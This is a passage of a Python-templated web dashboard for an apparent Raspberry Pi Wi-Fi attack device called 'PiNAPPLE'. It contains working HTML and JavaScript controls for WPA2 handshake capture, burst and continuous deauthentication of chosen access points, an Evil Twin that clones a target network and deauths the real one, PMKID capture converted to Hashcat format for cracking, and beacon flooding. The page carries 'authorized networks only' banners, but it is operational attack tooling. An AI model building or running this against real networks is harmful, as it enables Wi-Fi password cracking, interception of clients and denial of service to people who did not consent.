  <div class="sh"><span class="st">WPA2 Handshake Capture</span>
    <span style="color:var(--warn);font-size:0.75rem">&#9888; Authorized networks only</span></div>
  <p class="hint" style="margin:-8px 0 10px">Captures a WPA2 4-way handshake. The helper listens on the target channel and sends short deauth nudges to make a client reconnect. Successful captures are saved automatically to Saved.</p>
  <div class="status-card" role="status" aria-live="polite" id="hs-status-card">
    <span class="dot"></span>
    <div class="sc-copy"><strong id="hs-state">Idle</strong><span id="hs-sub">No capture running</span></div>
    <span class="sc-meta" id="hs-meta"></span>
  </div>
  <div class="card">
    <div class="fr">
      <div class="fg">
        <label>Target AP (from recon)</label>
        <select id="hs-net-sel" onchange="fillHandshake(this.value)">
          {net_opts}
        </select>
      </div>
      <div class="fg">
        <label>BSSID</label>
        <input id="hs-bssid" placeholder="AA:BB:CC:DD:EE:FF" style="text-transform:uppercase" autocomplete="off">
      </div>
    </div>
    <div class="fr">
      <div class="fg">
        <label>Channel</label>
        <input id="hs-channel" type="number" value="6" min="1" max="14" inputmode="numeric">
      </div>
      <div class="fg">
        <label>Client MAC (optional, broadcast = all)</label>
        <input id="hs-client" value="FF:FF:FF:FF:FF:FF" style="text-transform:uppercase" autocomplete="off">
      </div>
    </div>
    <div class="hint">Press Start, then wait up to 45 seconds. The capture succeeds when a client reconnects.</div>
    <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:12px">
      <button class="btn btn-acc" onclick="startHandshake()" id="hs-btn" style="flex:1;justify-content:center">&#128400; Start capture</button>
      <button class="btn btn-outline" onclick="stopHandshake()" id="hs-stop" disabled>&#9632; Stop</button>
    </div>
    <div id="hs-status" class="hint" style="display:none;margin-top:16px;padding:12px;background:var(--bg);border-radius:8px;font-family:monospace;white-space:pre-wrap"></div>
  </div>
  {scan_handshake}
</div>

<div id="pane-eviltwin" class="wl-pane" style="display: {d_eviltwin}">
  <div class="sh"><span class="st">Evil Twin</span>
    <span style="color:var(--warn);font-size:0.75rem">&#9888; Authorized networks only</span></div>
  <p class="hint" style="margin:-8px 0 10px">Clones a target SSID/BSSID on wlan0 and deauths the real AP so clients reconnect to the twin. Requires the hostapd stack. The phone may briefly disconnect from the PiNAPPLE hotspot.</p>
  <div class="warnbox">Starting the Evil Twin reconfigures wlan0, which serves this dashboard. Your phone may disconnect from PiNAPPLE and reconnect to the twin. Keep the dashboard open in another tab if possible.</div>
  <div class="status-card" role="status" aria-live="polite" id="et-status-card">
    <span class="dot"></span>
    <div class="sc-copy"><strong id="et-state">Idle</strong><span id="et-sub">No twin running</span></div>
    <span class="sc-meta" id="et-meta"></span>
  </div>
  <div class="card">
    <div class="fg">
      <label>Target network</label>
      <select id="et-net-sel" onchange="fillEvilTwin(this.value)">
        <option value="">-- manual entry --</option>
        {net_opts}
      </select>
    </div>
    <div class="fr" style="margin-top:12px">
      <div class="fg">
        <label>Target SSID</label>
        <input id="et-ssid" placeholder="Target SSID" autocomplete="off">
      </div>
      <div class="fg">
        <label>Target BSSID (MAC)</label>
        <input id="et-bssid" placeholder="Target BSSID (MAC)" style="text-transform:uppercase" autocomplete="off">
      </div>
    </div>
    <div class="fr" style="margin-top:12px">
      <div class="fg">
        <label>Channel</label>
        <input id="et-channel" type="number" value="6" min="1" max="14" inputmode="numeric">
      </div>
    </div>
    <div style="display:flex;gap:8px;margin-top:12px;flex-wrap:wrap">
      <button class="btn btn-danger" onclick="startEvilTwin()" id="et-start">Start Evil Twin</button>
      <button class="btn btn-outline" onclick="stopEvilTwin()" id="et-stop" disabled>Stop Evil Twin</button>
    </div>
    <div id="et-output" class="hint" style="display:none;margin-top:12px;font-family:monospace"></div>
  </div>
  {scan_eviltwin}
</div>

<div id="pane-pmkid" class="wl-pane" style="display: {d_pmkid}">
  <div class="sh"><span class="st">PMKID Capture</span>
    <span style="color:var(--warn);font-size:0.75rem">&#9888; Authorized networks only</span></div>
  <div class="status-card" role="status" aria-live="polite" id="pmkid-status-card">
    <span class="dot"></span>
    <div class="sc-copy"><strong id="pmkid-state">Idle</strong><span id="pmkid-sub">No capture running</span></div>
    <span class="sc-meta" id="pmkid-meta"></span>
  </div>
  <div class="card">
    <p class="hint" style="margin-top:0">Listens on wlan1 for a PMKID in beacons from nearby WPA2 networks, then converts the capture to Hashcat format. It captures whatever it hears; no target selection is needed.</p>
    <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:12px">
      <button class="btn btn-danger" onclick="startPmkid()" id="pmkid-start">Start PMKID</button>
      <button class="btn btn-outline" onclick="stopPmkid()" id="pmkid-stop" disabled>Stop &amp; Convert</button>
    </div>
    <div id="pmkid-output" class="hint" style="display:none;margin-top:12px;font-family:monospace;white-space:pre-wrap"></div>
  </div>
</div>

<div id="pane-beacon" class="wl-pane" style="display: {d_beacon}">
  <div class="bf-wrap">
    <div class="bf-head">
      <div>
        <div class="bf-eyebrow">WLAN1 &middot; Beacon Flood</div>
        <h2 class="bf-title">Fill the air with fake networks</h2>
        <p class="bf-sub">Type a name or phrase, choose how many copies to broadcast, and start. Each copy gets a number so phones see separate networks.</p>
      </div>
      <span class="bf-lab">&#9888; Authorized lab use only</span>
    </div>

    <div class="bf-live" id="bf-live" role="status" aria-live="polite">
      <span class="bf-dot"></span>
      <div class="bf-live-copy">
        <strong id="bf-status">Idle</strong>
        <span id="bf-live-sub">Ready to start</span>
      </div>
      <div class="bf-live-meta" id="bf-live-meta"></div>
    </div>

    <div class="bf-grid">
      <div class="card bf-card">
        <div class="card-title">What should appear?</div>

        <label class="bf-label" for="bf-phrase">Network name / phrase</label>
        <input id="bf-phrase" class="bf-input" maxlength="64" placeholder="e.g. Free Airport WiFi"
               autocomplete="off" autocapitalize="sentences" spellcheck="false">
        <div class="bf-hint">SSIDs are capped at 32 characters, so long phrases are trimmed automatically.</div>

        <label class="bf-label" for="bf-count">How many networks?</label>
        <div class="bf-stepper">
          <button type="button" onclick="bfStep(-1)" aria-label="Decrease network count">&minus;</button>
          <input id="bf-count" type="number" inputmode="numeric" min="1" max="200" value="25">
          <button type="button" onclick="bfStep(1)" aria-label="Increase network count">+</button>
        </div>
        <div class="bf-hint" id="bf-preview">25 networks will appear.</div>

        <details class="bf-advanced">
          <summary>Advanced settings</summary>
          <div class="bf-adv-grid">
            <label>Rate (pps)
              <input id="bf-rate" type="number" min="0" max="2000" value="0" inputmode="numeric" placeholder="auto">
            </label>
            <label>Channel(s)
              <input id="bf-channels" value="6" placeholder="6">
            </label>
            <label>Beacons / SSID
              <input id="bf-repeat" type="number" min="1" max="10" value="1" inputmode="numeric">
            </label>
            <label>Dwell (sec)
              <input id="bf-dwell" type="number" min="1" max="60" step="0.5" value="8" inputmode="decimal">
            </label>
          </div>
          <div class="bf-hint">Rate 0 = auto (10 &times; networks, 200&ndash;500 pps). One channel is fastest; use commas only for multi-channel coverage.</div>
        </details>

        <div class="bf-actions">
          <button class="btn bf-start" id="bf-start" onclick="startFlood()">&#9654; Start flooding</button>
          <button class="btn bf-stop" id="bf-stop" onclick="stopFlood()" disabled>&#9632; Stop</button>
        </div>
        <div id="bf-error" class="bf-error"></div>
      </div>

      <div class="card bf-card">
        <div class="card-title">Live broadcast</div>
        <div class="bf-stat-grid">
          <div><span id="bf-stat-count">0</span><small>networks</small></div>
          <div><span id="bf-stat-rate">&mdash;</span><small>packets/s</small></div>
          <div><span id="bf-stat-channel">&mdash;</span><small>channel</small></div>
          <div><span id="bf-stat-uptime">0s</span><small>uptime</small></div>
        </div>
        <div class="bf-badges" id="bf-active-ssids"></div>
        <div class="bf-empty" id="bf-empty">Start a flood to see the live network list here.</div>
        <div class="bf-log" id="bf-log"></div>
      </div>
    </div>

    <details class="bf-advanced" style="margin-top:16px">
      <summary>Pick a nearby SSID</summary>
      {scan_beacon}
    </details>
  </div>
</div>
""".format(
        a_probes='active' if active_tab == 'probes' else '',
        a_tracker='active' if active_tab == 'tracker' else '',
        a_deauth='active' if active_tab == 'deauth' else '',
        a_handshake='active' if active_tab == 'handshake' else '',
        a_eviltwin='active' if active_tab == 'eviltwin' else '',
        a_pmkid='active' if active_tab == 'pmkid' else '',
        a_beacon='active' if active_tab == 'beacon' else '',
        d_probes='block' if active_tab == 'probes' else 'none',
        d_deauth='block' if active_tab == 'deauth' else 'none',
        d_handshake='block' if active_tab == 'handshake' else 'none',
        d_beacon='block' if active_tab == 'beacon' else 'none',
        d_eviltwin='block' if active_tab == 'eviltwin' else 'none',
        d_pmkid='block' if active_tab == 'pmkid' else 'none',
        d_tracker='block' if active_tab == 'tracker' else 'none',
        nt=len(tracker),
        probe_rows=probe_rows, tracker_rows=tracker_rows,
        net_opts=net_opts,
        scan_deauth=scan_table('deauth'), scan_handshake=scan_table('handshake'),
        scan_eviltwin=scan_table('eviltwin'), scan_beacon=scan_table('beacon')
    )

    js = r"""<script>
let wlActiveTab = 'probes';
let hsJobId = null, hsPoll = null;
let contDeauthJobId = null, daPoll = null, daBurstId = null, daHydrated = false;
let etPoll = null, pmkidPoll = null;

const WL_TABS = ['probes','tracker','deauth','handshake','eviltwin','pmkid','beacon'];

function wlValidTab(tab){ return WL_TABS.indexOf(tab) >= 0; }

function setStatusCard(cardId, stateId, subId, metaId, kind, state, sub, meta){
  const card = document.getElementById(cardId);
  if(card){ card.classList.toggle('on', kind === 'on'); card.classList.toggle('err', kind === 'err'); }
  const s = document.getElementById(stateId); if(s) s.textContent = state || '';
  const b = document.getElementById(subId); if(b) b.textContent = sub || '';
  const m = document.getElementById(metaId); if(m) m.textContent = meta || '';
}

function showWlan1Tab(tab, updateUrl){
  if(!wlValidTab(tab)) tab = 'probes';
  wlActiveTab = tab;
  document.querySelectorAll('.wl-pane').forEach(function(p){
    p.style.display = (p.id === 'pane-' + tab) ? 'block' : 'none';
  });
  document.querySelectorAll('.wl-tab').forEach(function(a){
    const on = a.dataset.tab === tab;
    a.classList.toggle('active', on);
    a.setAttribute('aria-selected', on ? 'true' : 'false');
  });
  const activeTabEl = document.querySelector('.wl-tab.active');
  if(activeTabEl){
    try { activeTabEl.scrollIntoView({inline:'center', block:'nearest'}); } catch(e) {}
  }
  if(updateUrl !== false){
    try { history.replaceState(null, '', '?tab=' + tab); } catch(e) {}
  }
  if(tab === 'deauth' || tab === 'handshake' || tab === 'eviltwin' || tab === 'beacon') updateScanTable(tab);
  if(tab === 'deauth') refreshDeauthJobs();
  if(tab === 'beacon') updateBeaconStatus();
  if(tab === 'eviltwin') refreshEvilTwinStatus();
  if(tab === 'pmkid') refreshPmkidStatus();
  if(tab === 'probes') refreshProbes();
  if(tab === 'tracker') refreshTracker();
  document.querySelectorAll('.sidebar nav a').forEach(function(link){
    const href = link.getAttribute('href') || '';
    if(href.indexOf('/wlan1?tab=') === 0){
      link.classList.toggle('active', href === '/wlan1?tab=' + tab);
    }
  });
  labelTables();
}

document.querySelectorAll('.wl-tab').forEach(function(a){
  a.addEventListener('click', function(e){
    e.preventDefault();
    showWlan1Tab(a.dataset.tab);
  });
});

async function refreshWlan1Mode(){
  const r = await api('/api/wlan1/mode', 'GET');
  const badge = document.getElementById('wlan1-mode-badge');
  const owner = document.getElementById('wlan1-owner');
  if(!badge) return;
  const mode = (r && r.mode) ? r.mode : 'unknown';
  badge.textContent = mode;
  const colors = {managed:'#2e7d32', monitor:'#0a84ff', AP:'#1565c0', missing:'#555', unknown:'#555'};
  badge.style.background = colors[mode] || '#555';
  if(owner){
    if(r && r.owner){
      const names = {beacon:'Beacon Flood', deauth:'Deauth', pmkid:'PMKID', eviltwin:'Evil Twin', handshake:'Handshake'};
      owner.textContent = 'Radio busy: ' + (names[r.owner] || r.owner);
    } else {
      owner.textContent = '';
    }
  }
  document.querySelectorAll('.mode-btn').forEach(function(b){ b.disabled = !!(r && r.owner); });
  const rescan = document.getElementById('wl-rescan');
  if(rescan) rescan.disabled = !!(r && r.owner);
}

async function setWlan1Mode(mode, btn){
  document.querySelectorAll('.mode-btn').forEach(function(b){ b.disabled = true; });
  if(btn) busy(btn, true, 'Switching\u2026');
  const r = await api('/api/wlan1/mode', 'POST', {mode: mode});
  if(btn) busy(btn, false);
  if(r && r.ok){
    toast('wlan1 set to ' + (r.mode || mode), 'success');
  } else {
    toast('Mode switch failed: ' + ((r && r.error) || 'unknown'), 'error', 6000);
  }
  refreshWlan1Mode();
}

function filterTable(tbodyId, query){
  const t = document.getElementById(tbodyId);
  if(!t) return;
  const q = (query || '').toLowerCase();
  Array.prototype.forEach.call(t.rows, function(tr){
    tr.style.display = (!q || tr.textContent.toLowerCase().indexOf(q) >= 0) ? '' : 'none';
  });
}

function daUpdateEstimate(){
  const c = parseInt((document.getElementById('da-count') || {}).value, 10) || 0;
  const r = parseInt((document.getElementById('da-rate') || {}).value, 10) || 20;
  const el = document.getElementById('da-estimate');
  if(el) el.textContent = c + ' frames at ' + r + ' pps \u2248 ' + (c / r).toFixed(1) + ' seconds.';
}

async function refreshDeauthJobs(){
  if(document.visibilityState !== 'visible') return;
  if(wlActiveTab !== 'deauth' && !daBurstId) return;
  const d = await api('/api/wlan1/deauth/status', 'GET');
  if(!d || d.ok === false) return;

  const jobs = d.jobs || [];
  const running = jobs.filter(function(j){ return j.running; });
  const continuous = running.find(function(j){ return (j.mode || 'continuous') === 'continuous'; });
  const burst = running.find(function(j){ return j.mode === 'burst'; });
  const startBtn = document.getElementById('btn-cont-deauth-start');
  const stopBtn = document.getElementById('btn-cont-deauth-stop');

  if(continuous) contDeauthJobId = continuous.job_id;
  if(!daBurstId && burst) daBurstId = burst.job_id;
  if(continuous && !daHydrated){
    daHydrated = true;
    const bssidEl=document.getElementById('da-bssid');
    const chEl=document.getElementById('da-channel');
    const rateEl=document.getElementById('da-rate');
    if(bssidEl && !bssidEl.value) bssidEl.value = continuous.bssid || '';
    if(chEl) chEl.value = continuous.channel || '';
    if(rateEl) rateEl.value = continuous.rate || 20;
    daUpdateEstimate();
  }
  if(!continuous) daHydrated = false;
  if(startBtn) startBtn.disabled = !!continuous;
  if(stopBtn) stopBtn.disabled = !(continuous || burst || d.orphan);

  if(continuous){
    setStatusCard('da-status-card','da-state','da-sub','da-meta','on',
      'Continuous deauth active',
      'Target ' + continuous.bssid + ' \u00b7 ch ' + (continuous.channel || 'auto') + ' \u00b7 ' + continuous.rate + ' pps',
      'job ' + continuous.job_id);
  } else if(burst){
    setStatusCard('da-status-card','da-state','da-sub','da-meta','on',
      'Burst running', 'Sending deauth frames\u2026', 'job ' + burst.job_id);
  } else if(d.orphan){
    setStatusCard('da-status-card','da-state','da-sub','da-meta','err',
      'Orphaned deauth process', 'An earlier job is still transmitting. Stop it below.', 'pid ' + d.orphan.pid);
  } else {
    setStatusCard('da-status-card','da-state','da-sub','da-meta','', 'Idle', 'No deauth job running', '');
  }

  const target = document.getElementById('da-jobs');
  if(target){
    if(!jobs.length){
      target.textContent = '';
    } else {
      target.innerHTML = jobs.map(function(j){
        const extra = (j.elapsed != null ? ' \u00b7 ' + j.elapsed + 's' : '');
        return '<div>' + esc(j.mode || 'continuous') + ' ' + esc(j.job_id) + ': ' +
          (j.running ? 'ACTIVE' : 'finished') + ' \u2014 ' + esc(j.bssid) + ' ch ' +
          esc(j.channel || 'auto') + ' @ ' + esc(j.rate) + ' pps' + extra + '</div>';
      }).join('');
    }
  }

  if(daBurstId){
    const mine = jobs.find(function(j){ return j.job_id === daBurstId; });
    const out = document.getElementById('da-output');
    if(mine && out){
      out.style.display = 'block';
      out.textContent = mine.running
        ? ('Burst running: ' + (mine.elapsed || 0) + 's of about ' + (mine.estimated_seconds || '?') + 's')
        : (mine.output || 'Burst finished.');
      out.style.color = mine.running ? 'var(--warn)' : 'var(--grn)';
    }
    if(!mine || !mine.running) daBurstId = null;
  }

  if(!running.length && !d.orphan){
    if(daPoll){ clearInterval(daPoll); daPoll = null; }
  } else if(!daPoll){
    daPoll = setInterval(refreshDeauthJobs, 2000);
  }
}

async function fireDeauth(){
  const bssid = document.getElementById('da-bssid').value.trim();
  const client = document.getElementById('da-client').value.trim() || 'FF:FF:FF:FF:FF:FF';
  const count = parseInt(document.getElementById('da-count').value, 10) || 64;
  const channel = document.getElementById('da-channel').value.trim();
  const rate = parseInt(document.getElementById('da-rate').value, 10) || 20;
  if(!bssid){ toast('Enter a target BSSID first.', 'warn'); return; }
  if(!confirm('Send ' + count + ' deauth frames to ' + bssid + '?')) return;

  const btn = document.getElementById('da-burst-btn');
  busy(btn, true, 'Sending\u2026');
  const r = await api('/api/wlan1/deauth', 'POST', {bssid:bssid, client:client, count:count, channel:channel, rate:rate});
  busy(btn, false);

  if(r && r.ok && r.job_id){
    daBurstId = r.job_id;
    const out = document.getElementById('da-output');
    if(out){ out.style.display = 'block'; out.style.color = 'var(--warn)'; out.textContent = 'Burst running\u2026'; }
    toast('Burst started: ' + count + ' frames', 'success');
    refreshDeauthJobs();
    refreshWlan1Mode();
    if(!daPoll) daPoll = setInterval(refreshDeauthJobs, 2000);
  } else {
    toast('Deauth failed: ' + ((r && r.error) || 'unknown'), 'error', 6000);
  }
}

async function startContinuousDeauth(){
  const bssid = document.getElementById('da-bssid').value.trim();
  const client = document.getElementById('da-client').value.trim() || 'FF:FF:FF:FF:FF:FF';
  const channel = document.getElementById('da-channel').value.trim();
  const rate = parseInt(document.getElementById('da-rate').value, 10) || 20;
  if(!bssid){ toast('Enter a target BSSID first.', 'warn'); return; }
  if(!confirm('Start continuous deauth against ' + bssid + '? It transmits until you stop it.')) return;

  const btn = document.getElementById('btn-cont-deauth-start');
  busy(btn, true, 'Starting\u2026');
  const r = await api('/api/wlan1/deauth/continuous/start', 'POST', {bssid:bssid, client:client, channel:channel, rate:rate});
  busy(btn, false);
  if(r && r.status === 'success'){
    contDeauthJobId = r.job_id;
    toast('Continuous deauth started.', 'success');
    refreshDeauthJobs();
    refreshWlan1Mode();
  } else {
    toast('Could not start deauth: ' + ((r && r.message) || 'unknown'), 'error', 6000);
  }
}

async function stopContinuousDeauth(){
  let orphan = false;
  if(!contDeauthJobId){
    const d = await api('/api/wlan1/deauth/status', 'GET');
    const jobs = (d && d.jobs) || [];
    const j = jobs.find(function(x){ return x.running && (x.mode || 'continuous') === 'continuous'; }) ||
              jobs.find(function(x){ return x.running; });
    if(j) contDeauthJobId = j.job_id;
    else if(d && d.orphan) orphan = true;
  }
  if(!contDeauthJobId && !orphan){ toast('No deauth job is running.', 'warn'); refreshDeauthJobs(); return; }
  if(!confirm('Stop the running deauth job?')) return;

  const btn = document.getElementById('btn-cont-deauth-stop');
  busy(btn, true, 'Stopping\u2026');
  const r = await api('/api/wlan1/deauth/continuous/stop', 'POST', {job_id:contDeauthJobId});
  busy(btn, false);
  if(r && r.status === 'success'){
    contDeauthJobId = null;
    daBurstId = null;
    const out = document.getElementById('da-output');
    if(out && out.style.display !== 'none'){
      out.textContent = 'Deauth job stopped.';
      out.style.color = 'var(--dim)';
    }
    toast('Deauth job stopped.', 'success');
  } else {
    toast('Could not stop deauth: ' + ((r && r.message) || 'unknown'), 'error', 6000);
  }
  refreshDeauthJobs();
  refreshWlan1Mode();
}

window.wlReconMap = {};
function reconLookup(bssid){ return (window.wlReconMap || {})[String(bssid || '').toLowerCase()] || null; }

async function loadRecon(){
  try {
    const r = await fetch('/api/recon');
    const d = await r.json();
    window.wlReconMap = {};
    d.forEach(function(n){ if(n.bssid) window.wlReconMap[String(n.bssid).toLowerCase()] = n; });
    return d;
  } catch(e) { return []; }
}

async function fillHandshake(v){
  if(!v) return;
  document.getElementById('hs-bssid').value = v;
  let n = reconLookup(v);
  if(!n){ await loadRecon(); n = reconLookup(v); }
  if(n) document.getElementById('hs-channel').value = n.channel || 6;
}

async function fillEvilTwin(v){
  if(!v) return;
  document.getElementById('et-bssid').value = v;
  let n = reconLookup(v);
  if(!n){ await loadRecon(); n = reconLookup(v); }
  if(n){
    if(n.ssid) document.getElementById('et-ssid').value = n.ssid;
    document.getElementById('et-channel').value = n.channel || 6;
  }
}

async function startHandshake(){
  const bssid = document.getElementById('hs-bssid').value.trim();
  const channel = document.getElementById('hs-channel').value;
  const client = document.getElementById('hs-client').value.trim() || 'FF:FF:FF:FF:FF:FF';
  if(!bssid){ toast('Enter a target BSSID first.', 'warn'); return; }
  if(!confirm('Start WPA2 handshake capture on ' + bssid + ' channel ' + channel + '?')) return;

  const btn = document.getElementById('hs-btn');
  const st = document.getElementById('hs-status');
  const oldDl = document.getElementById('hs-download');
  if(oldDl) oldDl.remove();
  busy(btn, true, 'Capture running\u2026');
  st.style.display = 'block';
  st.style.color = 'var(--txt)';
  st.textContent = 'Starting capture on ' + bssid + ' ch' + channel + '\u2026';
  setStatusCard('hs-status-card','hs-state','hs-sub','hs-meta','on','Capturing','Waiting for a client to reconnect\u2026','');

  const r = await api('/api/wlan1/handshake', 'POST', {bssid:bssid, channel:channel, client:client});
  if(!r || !r.ok){
    busy(btn, false);
    st.style.color = 'var(--red)';
    st.textContent = 'Error: ' + ((r && r.error) || 'unknown');
    setStatusCard('hs-status-card','hs-state','hs-sub','hs-meta','err','Capture failed',(r && r.error) || 'unknown','');
    toast('Could not start capture: ' + ((r && r.error) || 'unknown'), 'error', 6000);
    return;
  }

  hsJobId = r.job_id;
  refreshWlan1Mode();
  beginHandshakePoll();
}

function beginHandshakePoll(){
  const btn = document.getElementById('hs-btn');
  const st = document.getElementById('hs-status');
  const stopBtn = document.getElementById('hs-stop');
  if(stopBtn) stopBtn.disabled = false;
  if(hsPoll) clearInterval(hsPoll);
  hsPoll = setInterval(async function(){
    if(document.visibilityState !== 'visible') return;
    if(!hsJobId) return;
    const s = await api('/api/wlan1/handshake/' + hsJobId, 'GET');
    if(!s || s.ok === false){
      clearInterval(hsPoll); hsPoll = null;
      busy(btn, false);
      if(stopBtn) stopBtn.disabled = true;
      setStatusCard('hs-status-card','hs-state','hs-sub','hs-meta','','Idle',
        'The capture job is no longer tracked (dashboard restarted?).', '');
      refreshWlan1Mode();
      return;
    }
    const elapsed = s.elapsed != null ? s.elapsed : 0;
    st.textContent = (s.output || '') + '\nElapsed: ' + elapsed + 's';
    if(s.status === 'running'){
      setStatusCard('hs-status-card','hs-state','hs-sub','hs-meta','on','Capturing','Waiting for a client to reconnect\u2026','elapsed ' + elapsed + 's');
      return;
    }

    clearInterval(hsPoll); hsPoll = null;
    busy(btn, false);
    if(stopBtn) stopBtn.disabled = true;
    refreshWlan1Mode();
    const old = document.getElementById('hs-download');
    if(old) old.remove();
    if(s.status === 'success' && s.pcap){
      st.textContent += '\n[+] HANDSHAKE CAPTURED!';
      st.style.color = 'var(--grn)';
      toast('Handshake captured and added to Saved.', 'success', 6000);
      setStatusCard('hs-status-card','hs-state','hs-sub','hs-meta','on','Handshake captured','The capture file is ready.','');
      const dl = document.createElement('a');
      dl.id = 'hs-download';
      dl.href = s.saved_id
        ? '/api/saved/download/' + encodeURIComponent(s.saved_id)
        : '/api/wlan1/pcap/' + encodeURIComponent(s.pcap);
      dl.textContent = s.saved_id ? 'Download handshake (Saved)' : ('Download ' + s.pcap);
      dl.className = 'btn btn-acc';
      dl.style.marginTop = '8px';
      dl.style.display = 'inline-flex';
      st.after(dl);
    } else if(s.status === 'cancelled'){
      st.style.color = 'var(--dim)';
      setStatusCard('hs-status-card','hs-state','hs-sub','hs-meta','','Capture stopped','Stopped by you.','');
    } else {
      st.style.color = 'var(--warn)';
      setStatusCard('hs-status-card','hs-state','hs-sub','hs-meta','err','Capture failed','No handshake was seen. Try again when a client reconnects.','');
      toast('Handshake not captured. Try again when a client reconnects.', 'warn', 7000);
    }
  }, 2000);
}

async function rehydrateHandshake(){
  const a = await api('/api/wlan1/handshake/active', 'GET');
  if(!a || !a.running) return;
  hsJobId = a.job_id;
  const btn = document.getElementById('hs-btn');
  const st = document.getElementById('hs-status');
  const stopBtn = document.getElementById('hs-stop');
  if(btn) busy(btn, true, 'Capture running\u2026');
  const bssidEl=document.getElementById('hs-bssid');
  const chEl=document.getElementById('hs-channel');
  if(bssidEl && !bssidEl.value) bssidEl.value=a.bssid||'';
  if(chEl && a.channel) chEl.value=a.channel;
  if(st){
    st.style.display = 'block';
    st.style.color = 'var(--txt)';
    st.textContent = 'Capture already running on ' + (a.bssid || 'target') +
      ' ch' + (a.channel || '?') + '\u2026';
  }
  if(stopBtn) stopBtn.disabled = false;
  setStatusCard('hs-status-card','hs-state','hs-sub','hs-meta','on','Capturing',
    'Waiting for a client to reconnect\u2026', a.elapsed != null ? ('elapsed ' + a.elapsed + 's') : '');
  beginHandshakePoll();
}

async function stopHandshake(){
  if(!hsJobId){
    const a = await api('/api/wlan1/handshake/active', 'GET');
    if(a && a.running) hsJobId = a.job_id;
  }
  if(!hsJobId){ toast('No handshake capture is running.', 'warn'); return; }
  const btn = document.getElementById('hs-stop');
  busy(btn, true, 'Stopping\u2026');
  const r = await api('/api/wlan1/handshake/stop', 'POST');
  busy(btn, false);
  if(r && r.ok){
    toast('Handshake capture stopped.', 'success');
  } else {
    toast('Could not stop capture: ' + ((r && r.error) || 'unknown'), 'error', 6000);
  }
  if(hsPoll){ clearInterval(hsPoll); hsPoll = null; }
  hsJobId = null;
  const startBtn = document.getElementById('hs-btn');
  if(startBtn) busy(startBtn, false);
  if(btn) btn.disabled = true;
  setStatusCard('hs-status-card','hs-state','hs-sub','hs-meta','','Capture stopped','Stopped by you.','');
  refreshWlan1Mode();
}

async function refreshEvilTwinStatus(){
  if(document.visibilityState !== 'visible') return;
  const r = await api('/api/wlan1/evil-twin/status', 'GET');
  if(!r || r.ok === false) return;
  const running = !!r.running;
  const start = document.getElementById('et-start');
  const stop = document.getElementById('et-stop');
  if(start) start.disabled = running;
  if(stop) stop.disabled = !running;
  if(running){
    setStatusCard('et-status-card','et-state','et-sub','et-meta','on','Evil Twin active',
      'Cloning ' + (r.ssid || '?') + ' on channel ' + (r.channel || '?'), '');
    const ssidEl=document.getElementById('et-ssid');
    const bssidEl=document.getElementById('et-bssid');
    const chEl=document.getElementById('et-channel');
    if(ssidEl && !ssidEl.value) ssidEl.value=r.ssid||'';
    if(bssidEl && !bssidEl.value) bssidEl.value=r.bssid||'';
    if(chEl && r.channel) chEl.value=r.channel;
    const out = document.getElementById('et-output');
    if(out){ out.style.display = 'block'; out.textContent = 'Cloning ' + (r.ssid || '?') + ' (' + (r.bssid || '?') + ') ch ' + (r.channel || '?'); }
  } else {
    setStatusCard('et-status-card','et-state','et-sub','et-meta','', 'Idle', 'No twin running', '');
  }
  if(running && !etPoll) etPoll = setInterval(function(){ if(wlActiveTab === 'eviltwin') refreshEvilTwinStatus(); }, 5000);
  if(!running && etPoll){ clearInterval(etPoll); etPoll = null; }
}

async function startEvilTwin(){
  const ssid = document.getElementById('et-ssid').value.trim();
  const bssid = document.getElementById('et-bssid').value.trim();
  const channel = document.getElementById('et-channel').value;
  if(!ssid || !bssid){ toast('Enter both the target SSID and BSSID.', 'warn'); return; }
  if(!confirm('Start Evil Twin for "' + ssid + '"?\n\nThis reconfigures wlan0 and may disconnect this phone from the PiNAPPLE hotspot.')) return;

  const btn = document.getElementById('et-start');
  busy(btn, true, 'Starting\u2026');
  const r = await api('/api/wlan1/evil-twin/start', 'POST', {ssid:ssid, bssid:bssid, channel:channel});
  busy(btn, false);
  if(r && r.ok){
    toast('Evil Twin started.', 'success', 5000);
    if(r.warnings && r.warnings.length){
      toast('Started with warnings: ' + r.warnings.join('; '), 'warn', 9000);
    }
    refreshEvilTwinStatus();
    refreshWlan1Mode();
  } else {
    toast('Could not start Evil Twin: ' + ((r && r.error) || 'unknown'), 'error', 7000);
  }
}

async function stopEvilTwin(){
  if(!confirm('Stop the Evil Twin and restore the default PiNAPPLE AP?')) return;
  const btn = document.getElementById('et-stop');
  busy(btn, true, 'Stopping\u2026');
  const r = await api('/api/wlan1/evil-twin/stop', 'POST');
  busy(btn, false);
  if(r && r.ok){
    toast('Evil Twin stopped. Default AP restored.', 'success', 5000);
  } else {
    toast('Could not stop Evil Twin: ' + ((r && r.error) || 'unknown'), 'error', 7000);
  }
  refreshEvilTwinStatus();
  refreshWlan1Mode();
}

async function refreshPmkidStatus(){
  if(document.visibilityState !== 'visible') return;
  const r = await api('/api/wlan1/pmkid/status', 'GET');
  if(!r || r.ok === false) return;
  const running = !!r.running;
  const start = document.getElementById('pmkid-start');
  const stop = document.getElementById('pmkid-stop');
  if(start) start.disabled = running;
  if(stop) stop.disabled = !running;
  if(running){
    setStatusCard('pmkid-status-card','pmkid-state','pmkid-sub','pmkid-meta','on','Capture active',
      'Listening for PMKID beacons on wlan1\u2026', r.started ? ('started ' + r.started) : '');
  } else {
    setStatusCard('pmkid-status-card','pmkid-state','pmkid-sub','pmkid-meta','', 'Idle', 'No capture running', '');
  }
  if(running && !pmkidPoll) pmkidPoll = setInterval(function(){ if(wlActiveTab === 'pmkid') refreshPmkidStatus(); }, 4000);
  if(!running && pmkidPoll){ clearInterval(pmkidPoll); pmkidPoll = null; }
}

async function startPmkid(){
  if(!confirm('Start PMKID capture? It listens on wlan1 until you stop it.')) return;
  const btn = document.getElementById('pmkid-start');
  busy(btn, true, 'Starting\u2026');
  const r = await api('/api/wlan1/pmkid/start', 'POST');
  busy(btn, false);
  if(r && r.ok){
    toast('PMKID capture started.', 'success');
    refreshPmkidStatus();
    refreshWlan1Mode();
  } else {
    toast('Could not start PMKID capture: ' + ((r && r.error) || 'unknown'), 'error', 7000);
  }
}

async function stopPmkid(){
  if(!confirm('Stop the capture and convert it to Hashcat format?')) return;
  const btn = document.getElementById('pmkid-stop');
  busy(btn, true, 'Converting\u2026');
  const r = await api('/api/wlan1/pmkid/stop', 'POST');
  busy(btn, false);
  const out = document.getElementById('pmkid-output');
  if(r && r.ok){
    const href = r.saved_id
      ? '/api/saved/download/' + encodeURIComponent(r.saved_id)
